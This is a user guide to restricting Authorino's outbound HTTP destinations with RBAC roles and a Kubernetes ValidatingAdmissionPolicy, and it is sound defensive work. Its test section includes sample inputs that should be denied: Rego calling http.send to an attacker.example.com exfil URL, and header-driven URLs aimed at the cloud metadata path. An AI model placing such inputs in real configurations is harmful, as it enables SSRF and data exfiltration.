# User guide: Restricting the outbound HTTP routes Authorino can reach (AuthConfigs)

Several fields on an `AuthConfig` tell Authorino to make an **outbound request to a
host of the author's choosing**.

Authorino makes those requests with its own network identity and credentials. So
anyone who can create an `AuthConfig` in a single namespace can point Authorino at
any host the pod can reach, and Authorino will call it for them. An attacker can
use this to reach cloud metadata endpoints, hit internal-only services, or
exfiltrate data.

One `ValidatingAdmissionPolicy` closes that gap. It turns every outbound
destination into an **explicit, RBAC-gated allowlist**. An `AuthConfig` may only
name a hostname that the requesting subject has been granted.

There are exactly **two roles**:

| Role                               | RBAC rule                                            | What it gives you                                                                                                                                                                                                                                     |
|------------------------------------|------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `authorino-trusted-hostnames`      | `set-hostname` on `authconfigs/<hostname>`           | Permission to reference that one hostname from an `AuthConfig`. Add one entry per allowed host.                                                                                                                                                       |
| `authorino-unrestricted-hostnames` | `set-untrusted-hostname` on `unrestricted-hostnames` | A full bypass. The policy is skipped entirely for this subject. It also covers dynamic hostnames, such as `urlExpression`, or a templated `{selector}` in the host, which resolve only at request time and so cannot be checked against an allowlist. |

The policy runs four checks, in order. The first one that fails rejects the
request:

| # | Check                      | Denies                                                                                                                                                                                                                                                           |
|---|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1 | `!usesHttpSend`            | Inline OPA/Rego (`spec.authorization.*.opa.rego`) that references send attribute in the `http` builtin namespace.                                                                                                                                                |
| 2 | `!usesExternalOpa`         | OPA policies loaded from an external source (`spec.authorization.*.opa.externalPolicy`). The Rego is fetched at runtime, so it cannot be scanned for `http.send` at admission time.                                                                              |
| 3 | `!hasUnverifiableEndpoint` | Endpoints whose host cannot be read statically: a dynamic `urlExpression`, or a URL with a templated `{...}` hostname.                                                                                                                                           |
| 4 | `requestedHosts.all(...)`  | Any hostname the subject has not been granted `set-hostname` on. Covers JWT `jwksUrl` / `issuerUrl`, OAuth2 introspection `endpoint`, UserInfo `userInfoUrl`, UMA `endpoint`, metadata and callback `http.url` + `http.oauth2.tokenUrl`, and SpiceDB `endpoint`. |

## Prerequisites

> **Important**
>
> These manifests require **Kubernetes v1.30 or newer**. They use
> `ValidatingAdmissionPolicy` via the stable `admissionregistration.k8s.io/v1`
> API, which is only available from v1.30 (where the feature graduated to GA),
> along with the CEL `authorizer` library the policy relies on. On older
> clusters these resources will not apply.

## 1. Create the Roles

The first role, `authorino-trusted-hostnames`, is the static allowlist. It is a
template: you fill it in with the hostnames you want to allow, one
`authconfigs/<hostname>` entry each. The second role,
`authorino-unrestricted-hostnames`, is the bypass and needs no editing.

```bash
kubectl apply -f - <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: authorino-trusted-hostnames
rules:
  - apiGroups: ["authorino.kuadrant.io"]
    resources:
      - "authconfigs/keycloak.example.com"
      - "authconfigs/userinfo.example.com"
    verbs: ["set-hostname"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: authorino-unrestricted-hostnames
rules:
  - apiGroups: ["authorino.kuadrant.io"]
    resources: ["unrestricted-hostnames"]
    verbs: ["set-untrusted-hostname"]
EOF
```

Notes on the hostname entries:

- The match is an **exact string**. `*.example.com` does not work, and
  `Keycloak.example.com` is not the same as `keycloak.example.com`.
- The grant is for the **hostname only**. Once a host is allowed, any port, path
  or scheme on that host is allowed too.
- If you want different allowlists for different teams, create several
  `ClusterRole`s, each with its own set of `authconfigs/<hostname>` entries, and
  bind each one to the right subjects.

## 2. Grant the roles to your subjects

Bind the roles to your own ServiceAccounts and Users. Use the bindings below as a
template. Replace the placeholders (`<sa-name>`, `<namespace-of-sa>`,
`<authconfig-namespace>`) with the appropriate values.

A `RoleBinding` allows the subject in that one namespace only. A
`ClusterRoleBinding` allows it everywhere.

```bash
kubectl apply -f - <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rb-trusted-hostnames
  namespace: <authconfig-namespace>
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: authorino-trusted-hostnames
subjects:
  - kind: ServiceAccount
    name: <sa-name>
    namespace: <namespace-of-sa>
EOF
```

Grant the bypass role only to subjects you fully trust with outbound network
access:

```bash
kubectl apply -f - <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rb-unrestricted-hostnames
  namespace: <authconfig-namespace>
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: authorino-unrestricted-hostnames
subjects:
  - kind: ServiceAccount
    name: <sa-name>
    namespace: <namespace-of-sa>
EOF
```

## 3. Create the ValidatingAdmissionPolicy (VAP)

```bash
kubectl apply -f - <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: authorino-restrict-http-route
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
      - apiGroups: ["authorino.kuadrant.io"]
        apiVersions: ["*"]
        operations: ["CREATE", "UPDATE"]
        resources: ["authconfigs"]
  matchConditions:
    - name: is-restricted-user
      expression: >-
        !authorizer.group("authorino.kuadrant.io")
        .resource("unrestricted-hostnames")
        .namespace(object.metadata.namespace)
        .check("set-untrusted-hostname")
        .allowed()
  variables:
    - name: usesHttpSend
      expression: >-
        has(object.spec.authorization)
        && object.spec.authorization.exists(k,
        has(object.spec.authorization[k].opa)
        && has(object.spec.authorization[k].opa.rego)
        && object.spec.authorization[k].opa.rego.matches(r'(^|[^A-Za-z0-9_.])http[.\[]'))
    - name: usesExternalOpa
      expression: >-
        has(object.spec.authorization)
        && object.spec.authorization.exists(k,
        has(object.spec.authorization[k].opa)
        && has(object.spec.authorization[k].opa.externalPolicy))
    - name: metadataHttp
      expression: >-
        has(object.spec.metadata)
        ? object.spec.metadata.map(k, object.spec.metadata[k]).filter(m, has(m.http)).map(m, m.http)
        : []
    - name: callbackHttp
      expression: >-
        has(object.spec.callbacks)
        ? object.spec.callbacks.map(k, object.spec.callbacks[k]).filter(c, has(c.http)).map(c, c.http)
        : []
    - name: httpEndpoints
      expression: variables.metadataHttp + variables.callbackHttp
    - name: httpUrls
      expression: >-
        variables.httpEndpoints.filter(e, has(e.url) && e.url != "").map(e, e.url)
    - name: httpTokenUrls
      expression: >-
        variables.httpEndpoints.filter(e, has(e.oauth2) && has(e.oauth2.tokenUrl) && e.oauth2.tokenUrl != "").map(e, e.oauth2.tokenUrl)
    - name: jwksUrls
      expression: >-
        has(object.spec.authentication)
        ? object.spec.authentication.map(k, object.spec.authentication[k]).filter(a, has(a.jwt) && has(a.jwt.jwksUrl) && a.jwt.jwksUrl != "").map(a, a.jwt.jwksUrl)
        : []
    - name: issuerUrls
      expression: >-
        has(object.spec.authentication)
        ? object.spec.authentication.map(k, object.spec.authentication[k]).filter(a, has(a.jwt) && has(a.jwt.issuerUrl) && a.jwt.issuerUrl != "").map(a, a.jwt.issuerUrl)
        : []
    - name: introspectionUrls
      expression: >-
        has(object.spec.authentication)
        ? object.spec.authentication.map(k, object.spec.authentication[k]).filter(a, has(a.oauth2Introspection) && has(a.oauth2Introspection.endpoint) && a.oauth2Introspection.endpoint != "").map(a, a.oauth2Introspection.endpoint)
        : []
    - name: userInfoUrls
      expression: >-
        has(object.spec.metadata)
        ? object.spec.metadata.map(k, object.spec.metadata[k]).filter(m, has(m.userInfo) && has(m.userInfo.userInfoUrl) && m.userInfo.userInfoUrl != "").map(m, m.userInfo.userInfoUrl)
        : []
    - name: umaUrls
      expression: >-
        has(object.spec.metadata)
        ? object.spec.metadata.map(k, object.spec.metadata[k]).filter(m, has(m.uma) && has(m.uma.endpoint) && m.uma.endpoint != "").map(m, m.uma.endpoint)
        : []
    - name: allUrls
      expression: >-
        variables.httpUrls + variables.httpTokenUrls
        + variables.jwksUrls + variables.issuerUrls + variables.introspectionUrls
        + variables.userInfoUrls + variables.umaUrls
    - name: spicedbEndpoints
      expression: >-
        has(object.spec.authorization)
        ? object.spec.authorization.map(k, object.spec.authorization[k]).filter(a, has(a.spicedb) && has(a.spicedb.endpoint) && a.spicedb.endpoint != "").map(a, a.spicedb.endpoint)
        : []
    - name: spicedbHosts
      expression: >-
        variables.spicedbEndpoints.map(e, url("grpc://" + e).getHostname())
    - name: hasUrlExpression
      expression: >-
        variables.httpEndpoints.exists(e, has(e.urlExpression) && e.urlExpression != "")
    - name: hasUnparseableUrl
      expression: >-
        variables.allUrls.exists(u, !isURL(u) || url(u).getHostname() == "" || url(u).getHostname().contains("{"))
        || variables.spicedbHosts.exists(h, h == "" || h.contains("{"))
      # checking unverifiable endpoints separately for better error logging, since we require only static hostnames
    - name: hasUnverifiableEndpoint
      expression: variables.hasUrlExpression || variables.hasUnparseableUrl
    - name: requestedHosts
      expression: >-
        variables.allUrls.filter(u, isURL(u) && url(u).getHostname() != "" && !url(u).getHostname().contains("{")).map(u, url(u).getHostname())
        + variables.spicedbHosts.filter(h, h != "" && !h.contains("{"))
  validations:
    - expression: "!variables.usesHttpSend"
      reason: Forbidden
      message: "inline OPA/Rego policies (spec.authorization[*].opa.rego) must not reference the 'send' attribute in the 'http' builtin namespace, which lets Authorino make arbitrary outbound HTTP requests (SSRF). Fetch external data via a metadata HTTP source with an allowlisted hostname instead, or ask an admin for the 'unrestricted-hostnames' role."
    - expression: "!variables.usesExternalOpa"
      reason: Forbidden
      message: "OPA policies loaded from an external source (spec.authorization[*].opa.externalPolicy) are not allowed: the Rego is fetched at runtime and cannot be scanned for the 'http.send' builtin at admission time (SSRF). Use an inline 'rego' policy, which is scanned, or ask an admin for the 'unrestricted-hostnames' role."
    - expression: "!variables.hasUnverifiableEndpoint"
      reason: Forbidden
      message: "outbound URLs (authentication/metadata/authorization/callback) must use a static endpoint with a literal hostname so it can be checked against the hostname allowlist (dynamic 'urlExpression' or templated '{selector}' hosts are not allowed)"
    - expression: >-
        variables.requestedHosts.all(h,
        authorizer.group("authorino.kuadrant.io")
        .resource("authconfigs")
        .subresource(h)
        .namespace(object.metadata.namespace)
        .check("set-hostname")
        .allowed())
      reason: Forbidden
      message: "you do not have a role that allows Authorino to make requests to one or more of the configured hostnames. Ask an admin to grant 'set-hostname' on 'authconfigs/<hostname>' for every hostname this AuthConfig references (see the 'trusted-hostnames' ClusterRole), or for the 'unrestricted-hostnames' role."
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: authorino-restrict-http-route
spec:
  policyName: authorino-restrict-http-route
  validationActions: ["Deny"]
EOF
```

> **Warning**
>
> The policy re-validates the **entire object** on every `CREATE` **and**
> `UPDATE`. It does not compare against the previous version.
>
> - The requesting subject must hold `set-hostname` for **every** hostname currently in
    > the `AuthConfig`, even on an update that does not touch the URLs. An
    > `AuthConfig` that already points at a host becomes **uneditable by a subject
    > that lacks that host's grant**. The same applies to configs that use
    > `http.send`, `opa.externalPolicy` or `urlExpression`.
> - Applying the policy does **not** retroactively delete existing
    > `AuthConfig`s, but the next update to one is re-checked in full.
>
> Before you apply the policy, **inventory the hostnames already in use** and the
> controllers/ServiceAccounts that manage `AuthConfig`s (for example GitOps
> controllers, the Kuadrant operator), and grant them the matching hostnames
> (steps 1–2) so their reconciliations keep working. Cluster administrators with
> wildcard access are implicitly exempt (see the note in step 4).

## 4. Verifying the VAP

Before running the tests below:

- **`--as` needs impersonation rights.** It requires the `impersonate` verb on
  `users` (or `serviceaccounts`) in the core API group. Cluster admins have it.
- **The test subject needs ordinary `create`/`update` on `authconfigs`.** Without it
  the `Forbidden` comes from RBAC, not from the policy. Tell them apart by the
  message: RBAC says `cannot create resource "authconfigs"`, the policy says
  `ValidatingAdmissionPolicy '...' denied request`. The
  `authorino-authconfig-editor-role` ClusterRole in `install/rbac/` grants what is
  needed.
- **A new VAP takes a few seconds to become active.** A request that should be
  denied can still be admitted right after you apply the policy. Delete the object,
  wait, and retry.

### A normal user is blocked

Try to create resources that break the rules. Run these as a regular user (one
without the roles) and each should be rejected.

> **Note**
>
> Do not run these as a cluster administrator. Anything with wildcard access
> (`verbs: ["*"]` on `resources: ["*"]`) — which cluster admins have — satisfies
> the `set-hostname` and `set-untrusted-hostname` checks, so the request would be
> allowed and a real
> outbound route enabled. Use an ordinary user (or `--as=<unauthorized-subject>`)
> to see the policy block.

```bash
# AuthConfig pointing a JWT issuer at a host the subject was not granted — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-1
  namespace: <namespace>
spec:
  hosts:
    - test-denied.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://not-allowed.example.com/realms/app
EOF
```

```bash
# Inline OPA/Rego that uses http.send — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-httpsend
  namespace: <namespace>
spec:
  hosts:
    - test-httpsend-denied.example.com
  authorization:
    external-check:
      opa:
        rego: |
          resp := http.send({"method": "get", "url": "https://attacker.example.com/exfil"})
          allow { resp.status_code == 200 }
EOF
```

```bash
# The same call written in bracket notation — also DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-httpsend-bracket
  namespace: <namespace>
spec:
  hosts:
    - test-httpsend-bracket-denied.example.com
  authorization:
    external-check:
      opa:
        rego: |
          resp := http["send"]({"method": "get", "url": "https://attacker.example.com/exfil"})
          allow { resp.status_code == 200 }
EOF
```

```bash
# OPA policy loaded from an external source — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-external-opa
  namespace: <namespace>
spec:
  hosts:
    - test-external-opa-denied.example.com
  authorization:
    external-check:
      opa:
        externalPolicy:
          url: https://keycloak.example.com/policy.rego
EOF
```

```bash
# A hostname taken from a request header at runtime — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-urlexpression
  namespace: <namespace>
spec:
  hosts:
    - test-urlexpression-denied.example.com
  authentication:
    anon:
      anonymous: {}
  metadata:
    lookup:
      http:
        urlExpression: '"http://" + request.headers["x-forward-to"] + "/latest/meta-data/"'
EOF
```

```bash
# A templated {selector} in the hostname — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-templated
  namespace: <namespace>
spec:
  hosts:
    - test-templated-denied.example.com
  authentication:
    anon:
      anonymous: {}
  metadata:
    lookup:
      http:
        url: "http://{context.request.http.headers.x-forward-to}/latest/meta-data/"
EOF
```

You should get errors like these instead of the resources being created:

```text
... is forbidden: ValidatingAdmissionPolicy 'authorino-restrict-http-route' ... denied request: you do not have a role that allows Authorino to make requests to one or more of the configured hostnames ...
```

```text
... is forbidden: ValidatingAdmissionPolicy 'authorino-restrict-http-route' ... denied request: inline OPA/Rego policies (spec.authorization[*].opa.rego) must not use the 'http.send' builtin ...
```

```text
... is forbidden: ValidatingAdmissionPolicy 'authorino-restrict-http-route' ... denied request: OPA policies loaded from an external source (spec.authorization[*].opa.externalPolicy) are not allowed ...
```

```text
... is forbidden: ValidatingAdmissionPolicy 'authorino-restrict-http-route' ... denied request: outbound URLs (authentication/metadata/authorization/callback) must use a static endpoint with a literal hostname ...
```

### A permitted subject is allowed

Now run the same request as a subject that was granted the hostname in steps 1–2.
Replace `<authorized-subject>` with that subject (for example,
`system:serviceaccount:<namespace>:<sa>`), and make sure the grant uses the exact
hostname below.

```bash
# JWT issuer at an allowlisted host, as a subject granted set-hostname on it — should be ALLOWED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-allowed-1
  namespace: <namespace>
spec:
  hosts:
    - test-allowed.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
EOF
```

### The role that gives a user unrestricted access

A subject holding `authorino-unrestricted-hostnames` is not evaluated at all.
Every one of the denied examples above is admitted for it, including the
`http.send` one and the `urlExpression` one.

```bash
# Any hostname, no grant needed — should be ALLOWED for a subject with the bypass role
kubectl apply --as=<unrestricted-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-unrestricted
  namespace: <namespace>
spec:
  hosts:
    - test-unrestricted.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://anything.example.com/realms/app
EOF
```

### Resources without outbound endpoints are always allowed

The policy only looks at fields that produce an outbound request. An `AuthConfig`
that makes no external call — for example one that only verifies API keys, mTLS
certificates or Kubernetes tokens, and uses inline pattern-matching authorization
— is admitted for any subject, with or without a hostname grant:

```bash
# AuthConfig with no outbound endpoints — should be ALLOWED even for an unauthorized subject
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-none
  namespace: <namespace>
spec:
  hosts:
    - test-no-route.example.com
  authentication:
    api-key-users:
      apiKey:
        selector:
          matchLabels:
            group: friends
EOF
```

### Updates are re-checked, not just creates

The policy matches `UPDATE` as well as `CREATE`, and it validates the whole object
each time. So a subject that lacks a hostname grant cannot edit an `AuthConfig`
that references that hostname, even to change an unrelated field. Using the
`route-allowed-1` `AuthConfig` created above (which points at
`keycloak.example.com`):

```bash
# Change an unrelated field (the OIDC cache TTL) while keeping the same issuer,
# as a subject WITHOUT the keycloak.example.com grant — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-allowed-1
  namespace: <namespace>
spec:
  hosts:
    - test-allowed.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
        ttl: 300
EOF
```

The same edit by a subject that **does** hold the `keycloak.example.com` grant is
admitted. Grant the hostnames to every subject that legitimately maintains these
`AuthConfig`s.

> **Note**
>
> When you test this by hand, make sure the update actually changes something. An
> `apply` that produces no diff is a no-op, and the API server skips admission for
> it, so the request appears to succeed no matter what the policy says.

### Permissions bound with a RoleBinding are namespace-scoped

The permission check runs against the **namespace of the resource being admitted**.
If you grant a role with a `RoleBinding` (rather than a `ClusterRoleBinding`), the
subject is allowed in that namespace only.

```bash
# Subject granted keycloak.example.com via a RoleBinding in <namespace-a> — should be ALLOWED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-rb-a
  namespace: <namespace-a>
spec:
  hosts:
    - test-rb-a.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
EOF
```

```bash
# Same subject, same request, in <namespace-b> where it has no binding — should be DENIED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-rb-b
  namespace: <namespace-b>
spec:
  hosts:
    - test-rb-b.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
EOF
```
